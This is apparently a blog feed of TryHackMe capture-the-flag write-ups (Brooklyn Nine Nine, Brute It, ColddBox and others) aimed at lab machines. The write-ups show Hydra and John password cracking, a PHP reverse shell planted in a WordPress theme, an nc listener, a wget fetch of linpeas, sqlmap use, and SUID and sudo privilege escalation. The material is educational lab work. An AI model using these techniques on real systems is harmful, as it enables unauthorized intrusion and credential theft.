good on your acting CV. Regards Sean Archer cage@national-treasure:~/email_backup$ cat email_2 cat email_2 From - Cage@nationaltreasure.com To - SeanArcher@BigManAgents.com Dear Sean We've had this discussion before Sean, I want bigger roles, I'm meant for greater things. Why aren't you finding roles like Batman, The Little Mermaid(I'd make a great Sebastian!), the new Home Alone film and why oh why Sean, tell me why Sean. Why did I not get a role in the new fan made Star Wars films?! There was 3 of them! 3 Sean! I mean yes they were terrible films. I could of made them great... great Sean.... I think you're missing my true potential. On a much lighter note thank you for helping me set up my home server, Weston helped too, but not overally greatly. I gave him some smaller jobs. Whats your username on here? Root? Yours Cage cage@national-treasure:~/email_backup$ cat email_3 cat email_3 From - Cage@nationaltreasure.com To - Weston@nationaltreasure.com Hey Son Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote down what it said. Could you look into it please? I think it could be something to do with his account on here. I want to know what he's hiding from me... I might need a new agent. Pretty sure he's out to get me. The note said: {hidden :kekw:} The guy also seems obsessed with my face lately. He came him wearing a mask of my face... was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha ahahahhahaha. Ahhh Face it... he's just odd. Regards The Legend - Cage Info gathered:\n {the_movie_name_in_first_email} can be a keyword sean == root \u0026ldquo;The note said: \u0026hellip;\u0026rdquo; could be another vingere ciphers  Breaking the ciphers using this, we get the password to root!\n3.4. Complete Takeover root@national-treasure:~/email_backup# cat email_1 cat email_1 From - SeanArcher@BigManAgents.com To - master@ActorsGuild.com Good Evening Master My control over Cage is becoming stronger, I've been casting him into worse and worse roles. Eventually the whole world will see who Cage really is! Our masterplan is coming together master, I'm in your debt. Thank you Sean Archer root@national-treasure:~/email_backup# cat email_2 cat email_2 From - master@ActorsGuild.com To - SeanArcher@BigManAgents.com Dear Sean I'm very pleased to here that Sean, you are a good disciple. Your power over him has become strong... so strong that I feel the power to promote you from disciple to crony. I hope you don't abuse your new found strength. To ascend yourself to this level please use this code: THM{mmm_tasty} Thank you Sean Archer System Compromised!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/0MxLYQa.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-break-out-the-cage-writeup/","title":"TryHackMe: Break Out The Cage Writeup"},{"content":"tags: THM OSCP This is an easy room with 2 equally fun paths to exploit. Steganography or Brute-forcing, Holt or Peralta. Then use GTFO bins to get the root.\n1. Scanning \u0026amp; Enumeration 1.1. Port Scanning Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 0 0 119 May 17 2020 note_to_jake.txt | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.17.8.184 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA) | 256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA) |_ 256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: POST OPTIONS HEAD GET |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Site doesn't have a title (text/html). Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Anonymous login shows us an interesting file: note_to_jake.txt.\nAlso running a full port scan, we get no additional information.\nNot shown: 65532 closed ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http 1.2 Web Exploration In the sourcecode, we see the following line: \u0026lt;!-- Have you ever heard of steganography? --\u0026gt;.\n1.3 FTP So one thing we found was Anonymous login in FTP. Let\u0026rsquo;s get the interesting file.\n┌──(kali㉿kali)-[/tmp] └─$ ftp 10.10.150.90 Connected to 10.10.150.90. 220 (vsFTPd 3.0.3) Name (10.10.150.90:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 0 114 4096 May 17 2020 . drwxr-xr-x 2 0 114 4096 May 17 2020 .. -rw-r--r-- 1 0 0 119 May 17 2020 note_to_jake.txt 226 Directory send OK. ftp\u0026gt; get note_to_jake.txt local: note_to_jake.txt remote: note_to_jake.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes). 226 Transfer complete. 119 bytes received in 0.00 secs (391.2826 kB/s) ftp\u0026gt; 221 Goodbye. Given that we have no other special pages, or any other ports - we have one option to brute-forcing SSH.\n┌──(kali㉿kali)-[/tmp] └─$ cat note_to_jake.txt From Amy, Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine This is one pathway we can take.\n1.4 Steganography Let\u0026rsquo;s get the image: http://10.10.150.90/brooklyn99.jpg.\nUsing steghide, to get the hidden file in the image -\n┌──(kali㉿kali)-[/tmp] └─$ steghide --extract --stegofile brooklyn99.jpg Enter passphrase: steghide: can not uncompress data. compressed data is corrupted. Okay. Let\u0026rsquo;s get StegSeek. It goes through the entire rockyou.txt in 2 seconds :)\nDownload the .deb file if you are on a debian based system, and install as shown below.\n┌──(kali㉿kali)-[~/Downloads] └─$ sudo dpkg --install stegseek_0.6-1.deb Selecting previously unselected package stegseek. (Reading database ... 305959 files and directories currently installed.) Preparing to unpack stegseek_0.6-1.deb ... Unpacking stegseek (0.6-1) ... Setting up stegseek (0.6-1) ... Time to get in!\n2. Foothold (Holt Path) ┌──(kali㉿kali)-[/tmp] └─$ stegseek brooklyn99.jpg StegSeek 0.6 - https://github.com/RickdeJager/StegSeek [i] Found passphrase: \u0026quot;*****\u0026quot; [i] Original filename: \u0026quot;note.txt\u0026quot;. [i] Extracting to \u0026quot;brooklyn99.jpg.out\u0026quot;. Voila! We get the passphrase, and the output file.\n┌──(kali㉿kali)-[/tmp] └─$ cat brooklyn99.jpg.out Holts Password: {password} Enjoy!! Logging in,\n┌──(kali㉿kali)-[/tmp] └─$ ssh holt@10.10.150.90 The authenticity of host '10.10.150.90 (10.10.150.90)' can't be established. ECDSA key fingerprint is SHA256:Ofp49Dp4VBPb3v/vGM9jYfTRiwpg2v28x1uGhvoJ7K4. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.150.90' (ECDSA) to the list of known hosts. holt@10.10.150.90's password: Last login: Tue May 26 08:59:00 2020 from 10.10.10.18 holt@brookly_nine_nine:~$ We are in!\n3. PrivEsc (Holt Path) Time to get the root. One very very good starting point is checking sudo permissions.\nholt@brookly_nine_nine:~$ sudo -l Matching Defaults entries for holt on brookly_nine_nine: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User holt may run the following commands on brookly_nine_nine: (ALL) NOPASSWD: /bin/nano Use GTFO bins. Too easy!\n4. Foothold (Jake Path) Let\u0026rsquo;s also explore the other path hinted in the room. As I mentioned above, we can brute-forcing SSH using Hydra.\n┌──(kali㉿kali)-[/tmp] └─$ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.150.90 -t 4 Hydra v9.1 (c) 2020 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-30 23:30:06 [DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task [DATA] attacking ssh://10.10.150.90:22/ [STATUS] 44.00 tries/min, 44 tries in 00:01h, 14344355 to do in 5433:29h, 4 active [22][ssh] host: 10.10.150.90 login: jake password: {password} 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-30 23:32:45 Logging in,\n┌──(kali㉿kali)-[~] └─$ ssh jake@10.10.150.90 jake@10.10.150.90's password: Last login: Mon May 31 03:59:08 2021 from 10.17.8.184 jake@brookly_nine_nine:~$ ls We do not have any flag here. What we need is root permissions, so that we have it all.\n5. PrivEsc (Jake Path) jake@brookly_nine_nine:~$ sudo -l Matching Defaults entries for jake on brookly_nine_nine: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User jake may run the following commands on brookly_nine_nine: (ALL) NOPASSWD: /usr/bin/less jake@brookly_nine_nine:~$ /usr/bin/less /root/root.txt jake@brookly_nine_nine:~$ Use GTFO bins.\nSystem FULLY Compromised!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/6XcDCc8.jpg","permalink":"https://chaudhary1337.github.io/p/tryhackme-brooklyn-nine-nine-writeup-all-paths/","title":"TryHackMe: Brooklyn Nine Nine Writeup (All Paths)"},{"content":"Play\n1. Scanning \u0026amp; Enumeration We do the below scans in parallel.\n1.1. Port Scanning Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA) | 256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA) |_ 256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Info gathered answers the following questions:\nHow many ports are open? What version of SSH is running? What version of Apache is running? Which Linux distribution is running? 1.2. Web Enumeration ┌──(kali㉿kali)-[~] └─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt,zip' -t 64 -q -u 10.10.106.189 /index.html (Status: 200) [Size: 10918] /{hidden_directory} (Status: 301) [Size: 314] [--\u0026gt; http://10.10.106.189/hidden_directory/] Flags:\n -w: Wordlist -x: eXtensions -t: Threads -q: Quiet -u: Url  index.html is the default ubuntu homepage for apache service. Nothing special.\nSearch for hidden directories on web server. What is the hidden directory? This is the directory that is hidden above.\n1.3. Web Exploration In the hidden directory we get the login panel. Looking at the source code, we get 2 interesting pieces of information:\n name of username and password fields (uselful) in bruteforcing username in a comment XD  1.4. Brute-Force From the source we have the variables: user and pass for username and password respectively.\nhydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.160.189 http-post-form \u0026quot;/{hidden_directory}/:user=^USER^\u0026amp;pass=^PASS^:invalid\u0026quot; -t 32\nFlags:\n -l: for single login -P: for a password list http-form-post: POST request for a http form the syntax for http-form-post is divided into three parts by two \u0026ldquo;:\u0026ldquo;s - as \u0026ldquo;x:y:z\u0026rdquo;  x: path to hidden directory y: user and pass parameter specification z: failure status. Note how \u0026ldquo;invalid\u0026rdquo; is a substring present in the failure message.    What is the user:password of the admin panel? Using Hydra, we can find the password.\n┌──(kali㉿kali)-[~] └─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.98.224 http-post-form \u0026quot;/{hidden_directory}/:user=^USER^\u0026amp;pass=^PASS^:invalid\u0026quot; -t 64 -vv Hydra v9.1 (c) 2020 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-09 02:16:45 [DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task [DATA] attacking http-post-form://10.10.98.224:80/{hidden_directory}/:user=^USER^\u0026amp;pass=^PASS^:invalid [VERBOSE] Resolving addresses ... [VERBOSE] resolving done [VERBOSE] Page redirected to http://10.10.98.224/{hidden_directory}/panel [VERBOSE] Page redirected to http://10.10.98.224/{hidden_directory}/panel/ [80][http-post-form] host: 10.10.98.224 login: admin password: {password} [STATUS] attack finished for 10.10.98.224 (waiting for children to complete tests) 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-09 02:17:05 2. Foothold Logging in, we get the following.\n the web flag RSA private key  Download the rsa key, save it. Change the permissions to 600, as chmod 600 id_rsa.\nTrying to login gives us:\n┌──(kali㉿kali)-[/tmp] └─$ ssh -i id_rsa john@10.10.98.224 Enter passphrase for key 'id_rsa': We need a passphrase. For that, we use ssh2john.\n┌──(kali㉿kali)-[/tmp] └─$ locate ssh2john /usr/share/john/ssh2john.py ┌──(kali㉿kali)-[/tmp] └─$ /usr/share/john/ssh2john.py id_rsa \u0026gt; hash ┌──(kali㉿kali)-[/tmp] └─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/ciphers [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 6 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press 'q' or Ctrl-C to abort, almost any other key for status {hidden} (id_rsa) 1g 0:00:00:05 DONE (2021-06-09 02:16) 0.1876g/s 2690Kp/s 2690Kc/s 2690KC/s 1990..*7¡Vamos! Session completed What is John\u0026rsquo;s RSA Private Key passphrase? Run JtR to brute-forcing id_rsa\u0026rsquo;s passphrase\n┌──(kali㉿kali)-[/tmp] └─$ ssh -i id_rsa john@10.10.98.224 Enter passphrase for key 'id_rsa': Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information disabled due to load higher than 1.0 63 packages can be updated. 0 updates are security updates. Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106 john@bruteit:~$ We are in!\n3. PrivEsc john@bruteit:~$ sudo -l Matching Defaults entries for john on bruteit: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User john may run the following commands on bruteit: (root) NOPASSWD: /bin/cat john@bruteit:~$ sudo /bin/cat /root/root.txt THM{hidden} And we get the root flag!\nHow about the password?\njohn@bruteit:/$ cat /etc/shadow cat: /etc/shadow: Permission denied john@bruteit:/$ sudo cat /etc/shadow root:{interesting_info_was_here} daemon:*:18295:0:99999:7::: bin:*:18295:0:99999:7::: sys:*:18295:0:99999:7::: ... We get the sha-3 hash and then crack using JtR again.\n┌──(kali㉿kali)-[/tmp] └─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 6 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status {hidden} (root) 1g 0:00:00:00 DONE (2021-06-09 02:30) 5.882g/s 4517p/s 4517c/s 4517C/s 123456..james1 Use the \u0026quot;--show\u0026quot; option to display all of the cracked passwords reliably Session completed What is the root\u0026rsquo;s password? We can answer this using the above\nroot.txt ditto\nAnd we are done!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/oMbEPD6.jpg","permalink":"https://chaudhary1337.github.io/p/tryhackme-brute-it-writeup/","title":"TryHackMe: Brute It Writeup"},{"content":"Play\n1. Scanning \u0026amp; Enumeration We do the below scans in parallel.\n1.1. Port Scanning Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: WordPress 4.1.31 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: ColddBox | One more machine Nothing interesting. Only port 80 open, no ssh.\nNot shown: 65530 closed ports PORT STATE SERVICE 80/tcp open http 4512/tcp open unknown 8584/tcp filtered unknown 43286/tcp filtered unknown 59766/tcp filtered unknown Again, these don\u0026rsquo;t look like they are expected. We may check 4512 later.+\n1.2. Web Enumeration ┌──(kali㉿kali)-[~] └─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt' -t 32 -q -u 10.10.141.86 /index.php (Status: 301) [Size: 0] [--\u0026gt; http://10.10.141.86/] /wp-content (Status: 301) [Size: 317] [--\u0026gt; http://10.10.141.86/wp-content/] /wp-login.php (Status: 200) [Size: 2547] /license.txt (Status: 200) [Size: 19930] /wp-includes (Status: 301) [Size: 318] [--\u0026gt; http://10.10.141.86/wp-includes/] /readme.html (Status: 200) [Size: 7173] /wp-trackback.php (Status: 200) [Size: 135] /wp-admin (Status: 301) [Size: 315] [--\u0026gt; http://10.10.141.86/wp-admin/] /hidden (Status: 301) [Size: 313] [--\u0026gt; http://10.10.141.86/hidden/] /xmlrpc.php (Status: 200) [Size: 42] Note the /hidden/ directory. Rest everything looks standard.\nI tried exploring the wp-trackback, but it looked like a dead end.\n1.3. Web Exploration The author is mentioned as:\nAuthor: the cold in person This username is incorrect, as shown by the WordPress error message. 1.4. Hidden Directory We find a hidden directory in the gobsuter scan. We thus get a list of the usernames:\n C0ldd Hugo Philip Trying them out gives the same error message for all of them. This means we can brute-forcing!   1.5. Brute-Force We use the wpscan tool.\nwpscan --url http://10.10.141.86/ -U c0ldd,philip,hugo -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 32 -\u0026gt;\n \u0026ndash;url: specifies the url -U: specifies the userlist -P: specifies the passwordlist -t: threads \u0026ndash;password-attack: self explanatory  Wait patiently, this scan took me 12+ minutes. We thus get: [SUCCESS] - c0ldd / {the author yeeted this} 2. Foothold To get a foothold, I usually edit the 404.php page. It can be found in: Appearance -\u0026gt; editor -\u0026gt; 404.php\nI put the phprevshell. This can be taken from github here\n Start a listener on selected port. Listen using nc -lnvp PORT_NUMBER_HERE. Go to: http://10.10.141.86/?p=2 (only post=1 exists)  ┌──(kali㉿kali)-[~/Desktop/tools/files] └─$ nc -lvnp 443 listening on [any] 443 ... connect to [10.17.8.184] from (UNKNOWN) [10.10.141.86] 54404 Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 06:14:23 up 45 min, 0 users, load average: 0.30, 12.10, 16.15 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) sh: 0: can't access tty; job control turned off $ python3 -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)' www-data@ColddBox-Easy:/$ We are in!\n3. PrivEsc I transferred the linpeas.sh file, which you can take from here.\nStart a python server on your machine, using sudo python3 -m http.server 80 and on the target machine, wget YOUR_IP_ADDRESS/linpeas.sh. Make sure that you are in a directory with write permisssions. One really good place is /tmp direcotry. Execute the file using bash linpeas.sh\nThe following was marked as potential PE vectors.\n[+] Operative system [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits Linux version 4.4.0-186-generic (buildd@lcy01-amd64-002) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12) ) #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 Distributor ID: Ubuntu Description: Ubuntu 16.04.7 LTS Release: 16.04 Codename: xenial Looks like an old kernel version.\n[+] Sudo version [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version Sudo version 1.8.16 This exploit only works in certain conditions:\n you know sudo password of any user the permissions look something like: (ALL, !root) /usr/bin/id.  [+] SUID - Check easy privesc, exploits and write perms [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid -rwsr-xr-x 1 root root 44K May 7 2014 /bin/ping6 -rwsr-xr-x 1 root root 44K May 7 2014 /bin/ping -rwsr-sr-x 1 daemon daemon 51K Jan 14 2016 /usr/bin/at ---\u0026gt; RTru64_UNIX_4.0g(CVE-2002-1614) -rwsr-xr-x 1 root root 217K Feb 8 2016 /usr/bin/find /usr/bin/find marked. We can also find other files with the set-uid bit. Look at the following.\nwww-data@ColddBox-Easy:/tmp$ find / -type f -perm -u=s 2\u0026gt; /dev/null find / -type f -perm -u=s 2\u0026gt; /dev/null /bin/su /bin/ping6 /bin/ping /bin/fusermount /bin/umount /bin/mount /usr/bin/chsh /usr/bin/gpasswd /usr/bin/pkexec /usr/bin/find /usr/bin/sudo /usr/bin/newgidmap /usr/bin/newgrp /usr/bin/at /usr/bin/newuidmap /usr/bin/chfn /usr/bin/passwd /usr/lib/openssh/ssh-keysign /usr/lib/snapd/snap-confine /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/dbus-1.0/dbus-daemon-launch-helper 3.1. SUID Bit: Find Binary Using GTFOBins - Find SUID.\nwww-data@ColddBox-Easy:/tmp$ find . -exec /bin/sh -p \\; -quit find . -exec /bin/sh -p \\; -quit # id id uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data) With this, we can view both the user and root flags in the /home/c0ldd and the /root directory.\n3.2. Exploration + SUDO: 3 Paths Note how we have the user c0ldd. Could we try and getting some credentials? From other machines, I know wp-config.php is a juicy file. Exploring that,\nwww-data@ColddBox-Easy:/var/www/html$ cat wp-config.php cat wp-config.php \u0026lt;?php /** * The base configurations of the WordPress. * * This file has the following configurations: MySQL settings, Table Prefix, * Secret Keys, and ABSPATH. You can find more information by visiting * {@link http://codex.cms.org/Editing_wp-config.php Editing wp-config.php} * Codex page. You can get the MySQL settings from your web host. * * This file is used by the wp-config.php creation script during the * installation. You don't have to use the web site, you can just copy this file * to \u0026quot;wp-config.php\u0026quot; and fill in the values. * * @package WordPress */ // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define('DB_NAME', 'colddbox'); /** MySQL database username */ define('DB_USER', 'c0ldd'); /** MySQL database password */ define('DB_PASSWORD', '{i ate this, was too tasty}'); /** MySQL hostname */ define('DB_HOST', 'localhost'); {truncated} define('WP_HOME', '/'); define('WP_SITEURL', '/'); /** Sets up WordPress vars and included files. */ require_once(ABSPATH . 'wp-settings.php'); We have credentials for c0ldd!\nwww-data@ColddBox-Easy:/var/www/html$ su c0ldd su c0ldd Password: {i hid this :P} c0ldd@ColddBox-Easy:/var/www/html$ cd ~ cd ~ c0ldd@ColddBox-Easy:~$ sudo -l sudo -l [sudo] password for c0ldd: {yes I ate this too. Don't judge me ok} Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy: (root) /usr/bin/vim (root) /bin/chmod (root) /usr/bin/ftp We see that we are allowed to run the 3 files as sudo. We use the following respectively for each of the binaries.\n GTFOBins - vim SUDO GTFOBins - chmod SUDO GTFOBins - ftp SUDO  This completes our room. System FULLY compromised!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/k2cJkVq.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-coldbox-writeup-all-paths/","title":"TryHackMe: ColdBox Writeup (All Paths)"},{"content":"Challenge home page. 0. Scanning \u0026amp; Enumeration Port Scanning PORT STATE SERVICE VERSION 6/tcp filtered unknown 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 1b:c2:b6:2d:fb:32:cc:11:68:61:ab:31:5b:45:5c:f4 (DSA) | 2048 8d:88:65:9d:31:ff:b4:62:f9:28:f2:7d:42:07:89:58 (RSA) |_ 256 40:2e:b0:ed:2a:5a:9d:83:6a:6e:59:31:db:09:4c:cb (ECDSA) 80/tcp open http Apache httpd 2.2.22 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-robots.txt: 1 disallowed entry |_/VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q= |_http-server-header: Apache/2.2.22 (Ubuntu) |_http-title: 360 No Scope! Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel I do not know about port 6, but we see some interesting stuff in robots.txt right away.\nWeb Enumeration ┌──(kali㉿kali)-[~] └─$ gobuster dir -u 10.10.9.174 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt' -t 32 -q /login (Status: 301) [Size: 310] [--\u0026gt; http://10.10.9.174/login/] /index (Status: 200) [Size: 94328] /index.php (Status: 200) [Size: 94328] /button (Status: 200) [Size: 39148] /static (Status: 200) [Size: 253890] /cat (Status: 200) [Size: 62048] /small (Status: 200) [Size: 689] /who (Status: 200) [Size: 3847428] /robots (Status: 200) [Size: 430] /robots.txt (Status: 200) [Size: 430] /iphone (Status: 200) [Size: 19867] /game1 (Status: 301) [Size: 310] [--\u0026gt; http://10.10.9.174/game1/] /egg (Status: 200) [Size: 25557] /dinner (Status: 200) [Size: 1264533] /ty (Status: 200) [Size: 198518] /ready (Status: 301) [Size: 310] [--\u0026gt; http://10.10.9.174/ready/] /saw (Status: 200) [Size: 156274] /game2 (Status: 301) [Size: 310] [--\u0026gt; http://10.10.9.174/game2/] /wel (Status: 200) [Size: 155758] /free_sub (Status: 301) [Size: 313] [--\u0026gt; http://10.10.9.174/free_sub/] /nicole (Status: 200) [Size: 367650] /server-status (Status: 403) [Size: 292] I let this scan run, and explored the tasks one by one - albeit randomly.\nEaster 1 Shove the hex thingy into CyberChef.\nEaster 2 Take the disallowed directory name, and put it as such:\nbase64 -\u0026gt; base64 -\u0026gt; remove spaces -\u0026gt; base64 -\u0026gt; remove spaces -\u0026gt; base64\nFeel free to use python3 snippet, ''.join(x.strip().split()), where x is the string to remove the spaces.\nGo to the directory and view the source code.\nEaster 3 /login/ source code :D\nEaster 4 I used sqlmap to do the attacks automatically.\nDatabase: THM_*****_** Table: nothing_inside [1 entry] +-------------------------+ | Easter_4 | +-------------------------+ | THM{noice} | +-------------------------+ Easter 5 Continuing on the previous one, look for the database dump, crack the hash using hashcat. The mode is 0 aka md5sum.\nEaster 6 The hint says \u0026ldquo;Look out for the response header\u0026rdquo;.\n┌──(kali㉿kali)-[/tmp] └─$ curl -i 10.10.9.174 -s | grep -v \u0026quot;Easter 14\u0026quot; | grep -i \u0026quot;easter\u0026quot; Busted: Hey, you found me, take this Easter 6: THM{yee} \u0026lt;!--! Easter 17--\u0026gt; \u0026lt;h3\u0026gt; Hey! I got the easter 20 for you. I leave the credential for you to POST (username:DesKel, password:heIsDumb). Please, I beg you. Don't let him know.\u0026lt;/h3\u0026gt; Here,\n curl  -i gets the response header as well as the complete response -s is Silent mode   grep  -v to inVert the search - that is, remove it from the search results -i is case Insensitive search    Easter 7 Checking the cookies. Easter 8 We change our user agent using curl as,\ncurl -A \u0026quot;Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1\u0026quot; 10.10.9.174 \u0026gt; rich.txt\nTaken from here.\n┌──(kali㉿kali)-[/tmp] └─$ cat rich.txt | grep \u0026quot;Easter 8\u0026quot; \u0026lt;h4\u0026gt;You are Rich! Subscribe to THM server ^^ now. Oh btw, Easter 8: THM{mmmmm} Easter 9 This one is closely related to 13. Once you press the button, you are taken to an intermediate page. Read the source code.\nEaster 10 We change the referer to tryhackme.com, without the http:// part.\n┌──(kali㉿kali)-[~] └─$ curl -H \u0026quot;referer: tryhackme.com\u0026quot; http://10.10.9.174/free_sub/ Nah, there are no voucher here, I'm too poor to buy a new one XD. But i got an egg for you. Easter 10: THM{mmmm} Recall, -H is used to specify the header.\nEaster 11 Main page, dinner menu. The hint is to select egg, but we do not have it as an option. So, we put a request as such:\ncurl --data \u0026quot;dinner=egg\u0026amp;submit=submit\u0026quot; 10.10.9.174 | grep -v \u0026quot;Easter 14\u0026quot; | grep -i \u0026quot;easter\u0026quot;\n--data is self explanatory. Rest of the flags have been explained above.\nEaster 12 We find a hidden and useless javascript file in the Network tab. Go to console and execute the function.\nEaster 13 Destroy the world to get the flag. Press the big button on the home page. Related to 9. Let the redirect happen.\nEaster 14 Viewing the source code of the main page, we get the following comment:\n\u0026lt;!--Easter 14\u0026lt;img src=\u0026quot;data:image/png;base64,iVBORw0KGgo ...\nRemove the comment parts and the html tags, and put it in CyberChef. As usual, magic button works its charm.\nEaster 15: Game 1 This one is a concoction of smart and dumb at the same time. You have to realise that those hashes are just mappings from letters to numbers. 